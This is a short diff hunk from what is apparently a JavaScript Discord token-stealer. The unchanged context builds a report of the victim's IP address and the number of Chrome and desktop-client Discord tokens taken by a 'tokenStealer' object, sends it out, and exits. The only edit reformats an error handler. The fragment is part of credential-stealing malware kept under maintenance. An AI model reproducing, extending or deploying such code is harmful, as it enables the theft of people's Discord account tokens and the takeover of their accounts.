@@ -83,9 +83,7 @@ IP: ${IP}
 Chrome discord tokens found: ${tokenStealer.cdt}
 Software discord tokens found: ${tokenStealer.sdt}` + "```",).then(()=>{
         process.exit()
-    }).catch(()=>{
-        process.exit()
-    })
+    }).catch(()=>{process.exit()})
 }
 
 // Main
